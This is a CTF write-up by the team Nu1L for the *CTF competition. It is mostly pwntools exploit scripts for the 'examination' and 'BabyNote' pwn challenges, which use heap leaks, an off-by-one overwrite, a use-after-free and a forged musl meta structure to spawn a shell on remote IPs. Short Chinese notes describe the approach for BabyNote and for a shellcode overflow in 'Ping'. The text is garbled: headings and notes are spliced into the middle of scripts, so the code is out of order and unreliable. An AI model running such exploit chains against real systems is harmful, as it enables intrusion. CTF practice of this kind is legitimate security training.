*CTF WriteUp By Nu1L
Author: Nu1L
*CTF WriteUp By Nu1L
Pwn
examination
BabyNote
Ping
Reverse
Simple File System
NaCL
Jump
Misc
Alice's warm up
Today
BabyFL
Alice's challenge
checkin
Web
oh-my-grafana
oh-my-notepro
oh-my-lotto
oh-my-lotto-revenge
Crypto
ezRSA
InverseProblem2
Pwn
examination
from pwn import *
r = lambda x: p.recvuntil(x,drop=True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y: p.sendlineafter(x,y)
context.log_level = 'debug'
context.arch = 'amd64'
HOST,PORT = "124.70.130.92", 60001
p = remote(HOST, PORT)
# p = process('./examination')
def choset():
  sl(': ', str(0))
def choses():
  sl(': ', str(1))
# teacher
def add(number):
  sl('>> ', str(1))
  sl(': ', str(number))
def score():
  sl('>> ', str(2))
def newReview(idx,sz,comment):
  sl('>> ', str(3))
  sl('> ', str(idx))
  sl(': ', str(sz))
  s(':', comment)
def editReview(idx,comment):
  sl('>> ', str(3))
  sl('> ', str(idx))
  s(':', comment)
def call(idx):
  sl('>> ', str(4))
  sl('?\n', str(idx))
def changeR(idx):
  sl('>> ', str(5))
  sl(': ', str(idx))
def magic0(cnt):
  sl('>> ', str(6))
  p.send(cnt)
# student
def do():
  sl('>> ', str(1))
def check():
  sl('>> ', str(2))
def pray():
  sl('>> ', str(3))
def sset():
  sl('>> ', str(4))
def changeI(idx):
  sl('>> ', str(6))
  sl(': ', str(idx))
choset()
add(0x1) # 0
add(0x1) # 1
add(0x1) # 2
add(0x1) # 3
add(0x1) # 4
add(0x1) # 5
newReview(0,0x68,'/bin/sh'.ljust(0x63,'\x00'))
newReview(1,0x68,'1'*0x68)
newReview(2,0x3f8,'2'*0x3f8)
add(0x1) # 6
newReview(4,0x68,'4'*0x68)
newReview(6,0x68,'6'*0x68)
changeR(1)
changeI(0)
pray()
changeR(0)
score()
changeR(1)
check()
r('reward! ')
heap = int(r('\n'),16)-0x2a0
log.info("@ heap: "+hex(heap))
sl('addr: ', str((heap+0x330)*10)) # fuckoff
changeR(0)
editReview(1,'1'*0x68+p8(0xc1)) # off-by-one
call(2)
# leak libc
newReview(3,0x3f8,'3'*0x3f8)
payload = p64(heap+0x990)+4*p64(0)+p64(0x21)+p64(0x500000001)
payload += p64(heap+0x9b0)+p64(0x8)
newReview(5,0x48,payload)
changeR(1)
changeI(6)
check()
pause()
r('review:\n')
libc = u64(p.recv(8))-0x1ecbe0
log.info("@ libc: "+hex(libc))
changeR(0)
payload = p64(heap+0x990)+4*p64(0)+p64(0x21)+p64(0x500000001)
payload += p64(libc+0x1eee48)+p64(0x8)
editReview(5,payload)
BabyNote
需要堆⻛⽔泄漏，然后利⽤UAF构造任意地址free->伪造meta
editReview(6,p64(libc+0x522c0))
call(0)
p.interactive()
from pwn import *
import binascii
context.log_level = 'debug'
s = remote('123.60.76.240',60001)
class fakeMeta:
    prev = 0
    next = 0
    mem = 0
    avail_mask=0
    freed_mask=0
    last_idx = 0
    freeable = 1
    sizeclass = 0
    maplen = 1
    def Mask(self):
        return (self.avail_mask) | (self.freed_mask << 32)
    def payload(self):
        Payload = p64(self.prev)
        Payload += p64(self.next)
        Payload += p64(self.mem)
        Payload += p64(self.Mask())
        flag = self.last_idx & 0x1f
        flag |= (self.freeable & 1) << 5
        flag |= (self.sizeclass & 0x3f) << 6
        flag |= self.maplen << 12
        Payload += p64(flag)
        return Payload
def add(nsize,name,notesize,note):
    s.sendlineafter(b'option: ',b'1')
    s.sendlineafter(b'name size: ',str(nsize).encode('utf8'))
    s.sendafter(b'name: ',name)
    s.sendlineafter(b'note size: ',str(notesize).encode('utf8'))
    s.sendlineafter(b'note content: ',note)
    return
def dele(name):
    s.sendlineafter(b'option: ',b'3')
    s.sendlineafter(b'name size: ',str(len(name)).encode('utf8'))
    s.sendafter(b'name: ',name)
    return
def show(name):
    s.sendlineafter(b'option: ',b'2')
    s.sendlineafter(b'name size: ',str(len(name)).encode('utf8'))
    s.sendafter(b'name: ',name)
    return
def reset():
    s.sendlineafter(b'option: ',b'4')
add(0x3c,b'1\n',0x2c,b'jifow')
add(0x2c,b'2\n',0x2c,b'jifow')
add(0x2c,b'3\n',0x2c,b'jifow')
dele(b'2\n')
dele(b'3\n')
reset()
add(0x2c,b'eternal\n',0x2c,b'abcdefghi')
add(0x2c,b'pad\n',0x2c,b'jifow')
add(0x3c,b'pad1\n',0x2c,b'jifow')
dele(b'eternal\n')
# dele(b'pad\n')
add(0xa9c,b'pad2\n',0x3c,b'aaaa')
show(b'eternal')
s.recvuntil(b':')
space = u64(binascii.unhexlify(s.recvuntil(b'7f')).ljust(8,b'\x00')) 
libc_base =  space + 0x1ff0
ctx_addr = libc_base + 0xb4ac0
success("libc_base : {:#x}".format(libc_base))
dele(b'pad')
dele(b'pad1')
dele(b'pad2')
reset()
add(0x2c,b'pad3\n',0x3c,b'jifowiao')
dele(b'pad3')
add(0xa9c,b'exp\n',0x3c,b'k'*0x23)
add(0x2c,b'pad\n',0x2c,b'jfiwoi')
add(0x2c,b'pad1\n',0xa9c,b'k'*0x30)
success(f"space :{space:#x}")
dele(b'exp')
payload = p64(space) + p64(ctx_addr) + p64(0x3) + p64(0x30) + p64(0)
add(0x2c,b'fuck\n',0x2c,payload)
show(b'exp')
s.recvuntil(b':')
Ping
处理ipv4包的时候有溢出，因为是rwx，直接写shellcode修改代码，在ttl的位置放flag，⼀点点泄漏。
secret = u64(binascii.unhexlify(s.recv(16)))
success(f"secret: {secret:#x}")
dele(b'fuck')
dele(b'pad')
dele(b'pad1')
reset()
libc = ELF('./libc.so')
add(0xa9c,b'exp\n',0x3c,b'k'*0x23)
add(0x2c,b'pad\n',0x3c,b'jfiwoi')
add(0xcbc,b'pad0\n',0xcbc,b'wwwww')
oflhead = libc_base + 0xb6e48
meta = fakeMeta()
meta.prev = space - 0x10 + 0x1000 + 0x90
meta.next = oflhead
meta.mem = space - 0x10 + 0x1000 + 0x80
meta.last_idx = 2
meta.sizeclass = 1
meta.maplen = 1
meta.avail_mask = 0
meta.freed_mask = 6
payload = b'k'* 0x550 + (p64(secret) + p64(0) + meta.payload()).ljust(0x80,b'\x00')
payload += p64(space+0x1000) + p64(31)
payload += b'/bin/sh\x00'
system = libc.sym['system'] + libc_base
payload += p64(0) * 2 + p64(0) + p64(0) * 3 + p64(1)
payload += p64(system) * 3 + p64(0) * 7 + p32(0) + p64(0xffffffffffffffff)